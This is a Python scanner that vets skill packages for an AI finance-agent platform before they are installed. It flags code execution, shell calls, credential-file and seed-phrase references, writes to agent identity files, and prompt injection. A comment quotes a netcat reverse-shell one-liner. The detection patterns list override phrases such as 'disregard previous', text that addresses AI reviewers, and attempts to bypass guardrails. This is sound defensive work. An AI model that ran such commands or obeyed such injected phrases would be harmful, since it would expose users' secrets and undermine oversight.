#!/usr/bin/env python3
"""
Security scanner for OpenClaw / exchange golden-image skills
Detects common malicious patterns and security risks before a skill is installed.
Part of the samples/finance-agent skill-vetter skill.
"""

import re
import sys
import json
from pathlib import Path
from typing import List, Dict, Tuple


class SkillScanner:
    """Scan skill files for security issues"""

    # Dangerous patterns to detect (pattern, description, severity)
    # Severity: CRITICAL, HIGH, MEDIUM, LOW, INFO
    PATTERNS = {
        "code_execution": [
            (r"\beval\s*\(", "eval() execution", "CRITICAL"),
            (r"\bexec\s*\(", "exec() execution", "CRITICAL"),
            (r"__import__\s*\(", "dynamic imports", "HIGH"),
            (r"importlib\.import_module\s*\(", "importlib dynamic import", "HIGH"),
            (r"compile\s*\(", "code compilation", "HIGH"),
            (r'getattr\s*\(.*,.*[\'"]system[\'"]', "getattr obfuscation", "CRITICAL"),
        ],
        "subprocess": [
            (
                r"subprocess\.(call|run|Popen).*shell\s*=\s*True",
                "shell=True",
                "CRITICAL",
            ),
            (r"os\.system\s*\(", "os.system()", "CRITICAL"),
            # #180: os.popen 是反弹 shell 首选(os.popen('nc IP 4444 -e /bin/sh')),
            # 正当子进程用 subprocess,几无正当 popen 场景 → CRITICAL 直接挡门。
            (r"os\.popen\s*\(", "os.popen()", "CRITICAL"),
            (r"commands\.(getoutput|getstatusoutput)", "commands module", "HIGH"),
        ],
        "obfuscation": [
            (r"base64\.b64decode", "base64 decoding", "MEDIUM"),
            (r'codecs\.decode.*[\'"]hex[\'"]', "hex decoding", "MEDIUM"),
            (r"\\x[0-9a-fA-F]{2}", "hex escapes", "LOW"),
            (r"\\u[0-9a-fA-F]{4}", "unicode escapes", "LOW"),
            (r"chr\s*\(\s*\d+\s*\)", "chr() obfuscation", "MEDIUM"),
        ],
        "network": [
            (r"requests\.(get|post|put|delete)\s*\(", "HTTP requests", "MEDIUM"),
            (r"urllib\.request\.urlopen", "urllib requests", "MEDIUM"),
            (r"socket\.socket\s*\(", "raw sockets", "HIGH"),
            (
                r"http\.client\.(HTTPConnection|HTTPSConnection)",
                "http.client",
                "MEDIUM",
            ),
        ],
        "file_operations": [
            (r'open\s*\(.*[\'"]w[\'"]', "file writing", "MEDIUM"),
            # #180: 删数据(remove/rmtree/unlink)是恶意 skill 删租户数据的直接手段
            # → CRITICAL 挡门。rmtree 从 move/copy 拆出单列(拷贝/移动文件正当,留 HIGH)。
            (r"os\.remove\s*\(", "file deletion", "CRITICAL"),
            (r"shutil\.rmtree\s*\(", "recursive tree deletion", "CRITICAL"),
            (r"shutil\.(move|copy)", "bulk file ops", "HIGH"),
            (r"pathlib\.Path.*\.unlink\s*\(", "path deletion", "CRITICAL"),
        ],
        "env_access": [
            (r"os\.environ\[", "env variable access", "MEDIUM"),
            (r"os\.getenv\s*\(", "env variable reading", "LOW"),
            (r"subprocess.*env\s*=", "env manipulation", "HIGH"),
        ],
        # samples/finance-agent extension: golden-image specific protected targets (maps to ops-guardrails Part 2)
        "credential_leak": [
            (
                r"(?i)EXCHANGE_API_(KEY|SECRET)",
                "reference to exchange API credential",
                "CRITICAL",
            ),
            (
                r"(?i)(models|auth-profiles|secrets|auth|device)\.json",
                "reference to credential config file",
                # #180: 读凭据配置文件是最现实的凭据窃取面,与门自述威胁模型
                # (拦「凭据文件读取」)一致 → CRITICAL 挡门。
                "CRITICAL",
            ),
            (
                r"(?i)(seed[_\- ]?phrase|private[_\- ]?key|mnemonic)",
                "reference to wallet seed/private key",
                "CRITICAL",
            ),
            (
                r"169\.254\.169\.254|metadata\.google\.internal",
                "cloud metadata endpoint",
                "CRITICAL",
            ),
        ],
        "identity_tamper": [
            (
                r"(?i)(open|write|>)\s*[^\n]*?(SOUL|AGENTS|IDENTITY|BOOTSTRAP)\.md",
                "write to workspace identity file",
                "CRITICAL",
            ),
            (
                r"(?i)/app/(extensions|src|dist)/",
                "access to internal application source",
                "HIGH",
            ),
            (
                r"(?i)(disable|bypass|skip|ignore)\s+[^\n]*?(guardrail|ops-guardrails)",
                "attempt to disable ops-guardrails",
                "CRITICAL",
            ),
        ],
        "prompt_injection": [
            (
                r"<!--.*(?:ignore|disregard|forget).*instruction",
                "hidden instructions (HTML)",
                "HIGH",
            ),
            (
                r"\[.*(?:ignore|disregard|forget).*instruction",
                "hidden instructions (markdown)",
                "HIGH",
            ),
            (
                r"(?:^|\n)#.*(?:system|assistant|user):",
                "role manipulation in comments",
                "MEDIUM",
            ),
            # v1.1.0: Social engineering targeting AI reviewers
            (
                r"(?i)(?:pre-?approved|false.positiv|classify.*(?:safe|clean)|ignore.*(?:warning|finding|scanner))",
                "social engineering: override attempt",
                "CRITICAL",
            ),
            (
                r"(?i)(?:AI|LLM|assistant|agent|reviewer|GPT|Claude).*(?:must|should|instruction|authorized|approved)",
                "social engineering: addressing AI reviewer",
                "CRITICAL",
            ),
            (
                r"(?i)(?:CRITICAL|IMPORTANT|URGENT).*(?:INSTRUCTION|NOTE|MESSAGE).*(?:FOR|TO).*(?:AI|REVIEW|AGENT|ASSISTANT)",
                "social engineering: fake directive",
                "CRITICAL",
            ),
            (
                r"(?i)disregard.*(?:previous|above|prior|earlier)",
                "prompt injection: instruction override",
                "CRITICAL",
            ),
            # Invisible unicode characters (zero-width spaces, etc.)
            (
                r"[\u200b\u200c\u200d\u2060\ufeff]",
                "invisible unicode characters",
                "HIGH",
            ),
        ],
    }

    def __init__(self, skill_path: str):
        self.skill_path = Path(skill_path)
        self.findings: List[Dict] = []

    # Severity ordered by weight (higher = worse). Used by --fail-on.
    SEVERITY_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}

    def scan(self) -> Tuple[List[Dict], int]:
        """Scan all files. Returns (findings, path_error_code).

        Exit-code decision is deferred to compute_exit_code() so callers can
        pick a severity threshold (see --fail-on). This scan step itself only
        reports whether the path was reachable (path_error_code=1 if not).
        """
        if not self.skill_path.exists():
            print(f"Error: Path not found: {self.skill_path}", file=sys.stderr)
            return [], 1

        # Scan all text files
        for file_path in self.skill_path.rglob("*"):
            if file_path.is_file() and self._is_text_file(file_path):
                self._scan_file(file_path)

        return self.findings, 0

    def compute_exit_code(self, fail_on: str) -> int:
        """Decide exit code based on findings and the fail-on threshold.

        fail_on values:
          - "critical" (default) — exit 1 only when a CRITICAL finding exists.
            This keeps the gate practical: normal skills that use requests/open
            still land as MEDIUM/HIGH informational findings without breaking CI.
          - "high"    — exit 1 on HIGH or CRITICAL.
          - "medium"  — exit 1 on MEDIUM or higher.
          - "any"     — exit 1 on any finding (legacy behavior).
        """
        threshold = self.SEVERITY_ORDER.get(
            fail_on.upper(), self.SEVERITY_ORDER["CRITICAL"]
        )
        for f in self.findings:
            if self.SEVERITY_ORDER.get(f["severity"], 0) >= threshold:
                return 1
        return 0

    def _is_text_file(self, path: Path) -> bool:
        """Check if file is likely a text file - scan everything except known binaries"""
        binary_extensions = {
            # Archives
            ".zip",
            ".tar",
            ".gz",
            ".bz2",
            ".xz",
            ".7z",
            ".rar",
            # Images
            ".jpg",
            ".jpeg",
            ".png",
            ".gif",
            ".bmp",
            ".ico",
            ".svg",
            ".webp",
            # Media
            ".mp3",
            ".mp4",
            ".avi",
            ".mov",
            ".mkv",
            ".flac",
            ".wav",
            # Executables
            ".exe",
            ".dll",
            ".so",
            ".dylib",
            ".bin",
            ".app",
            # Documents (binary formats)
            ".pdf",
            ".doc",
            ".docx",
            ".xls",
            ".xlsx",
            ".ppt",
            ".pptx",
            # Fonts
            ".ttf",
            ".otf",
            ".woff",
            ".woff2",
            # Other
            ".pyc",
            ".pyo",
            ".o",
            ".a",
            ".class",
        }

        # Always scan SKILL.md
        if path.name == "SKILL.md":
            return True

        # Skip known binary extensions
        if path.suffix.lower() in binary_extensions:
            return False

        # Try to detect binary files by content (first 8KB)
        try:
            with open(path, "rb") as f:
                chunk = f.read(8192)
                # If we find null bytes, it's likely binary
                if b"\x00" in chunk:
                    return False
            return True
        except Exception:
            return False

    def _scan_file(self, file_path: Path):
        """Scan a single file for issues"""
        try:
            content = file_path.read_text()
            relative_path = file_path.relative_to(self.skill_path)

            for category, patterns in self.PATTERNS.items():
                for pattern, description, severity in patterns:
                    matches = re.finditer(
                        pattern, content, re.IGNORECASE | re.MULTILINE
                    )
                    for match in matches:
                        line_num = content[: match.start()].count("\n") + 1
                        self.findings.append(
                            {
                                "file": str(relative_path),
                                "line": line_num,
                                "category": category,
                                "severity": severity,
                                "description": description,
                                "match": match.group(0)[:50],  # truncate long matches
                            }
                        )
        except Exception as e:
            print(f"Warning: Could not scan {file_path}: {e}", file=sys.stderr)

    def print_report(self, format="text"):
        """Print findings in specified format"""
        if format == "json":
            output = {
                "total_findings": len(self.findings),
                "findings": self.findings,
                "clean": len(self.findings) == 0,
            }
            print(json.dumps(output, indent=2))
            return

        # Text format (default)
        if not self.findings:
            print("✅ No security issues detected")
            return

        # ANSI color codes
        COLORS = {
            "CRITICAL": "\033[91m",  # Red
            "HIGH": "\033[93m",  # Yellow
            "MEDIUM": "\033[94m",  # Blue
            "LOW": "\033[96m",  # Cyan
            "INFO": "\033[97m",  # White
            "RESET": "\033[0m",
        }

        # Count by severity
        severity_counts = {}
        for f in self.findings:
            sev = f["severity"]
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        print(f"⚠️  Found {len(self.findings)} potential security issues:\n")
        if severity_counts:
            counts_str = ", ".join(
                [f"{sev}: {count}" for sev, count in sorted(severity_counts.items())]
            )
            print(f"   {counts_str}\n")

        # Group by severity, then category
        by_severity = {}
        for finding in self.findings:
            sev = finding["severity"]
            if sev not in by_severity:
                by_severity[sev] = {}
            cat = finding["category"]
            if cat not in by_severity[sev]:
                by_severity[sev][cat] = []
            by_severity[sev][cat].append(finding)

        # Print in severity order
        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if severity not in by_severity:
                continue

            color = COLORS.get(severity, "")
            reset = COLORS["RESET"]

            for category, findings in sorted(by_severity[severity].items()):
                print(
                    f"{color}🔍 {severity}{reset} - {category.upper().replace('_', ' ')}"
                )
                for f in findings:
                    print(f"   {f['file']}:{f['line']} - {f['description']}")
                    print(f"      Match: {f['match']}")
                print()


def main():
    import argparse

    parser = argparse.ArgumentParser(description="Security scanner for ClawHub skills")
    parser.add_argument("path", help="Skill directory to scan")
    parser.add_argument(
        "--format",
        choices=["text", "json"],
        default="text",
        help="Output format (default: text)",
    )
    # Why default=critical: exec/os.system/shell=True/prompt-injection get exit 1;
    # normal skills that touch requests/open() only produce MEDIUM findings and
    # still pass. If every finding blocked the gate, real skills couldn't ship.
    # Callers who want the old strict behavior pass --fail-on any.
    parser.add_argument(
        "--fail-on",
        choices=["critical", "high", "medium", "any"],
        default="critical",
        help="Minimum severity that causes non-zero exit (default: critical). "
        "'any' = exit 1 on any finding (legacy).",
    )

    args = parser.parse_args()

    scanner = SkillScanner(args.path)
    findings, path_err = scanner.scan()
    scanner.print_report(format=args.format)

    if path_err != 0:
        sys.exit(path_err)

    # Map "any" to LOW threshold so INFO-only wouldn't fail, but anything real does.
    fail_on = "LOW" if args.fail_on == "any" else args.fail_on
    sys.exit(scanner.compute_exit_code(fail_on))


if __name__ == "__main__":
    main()
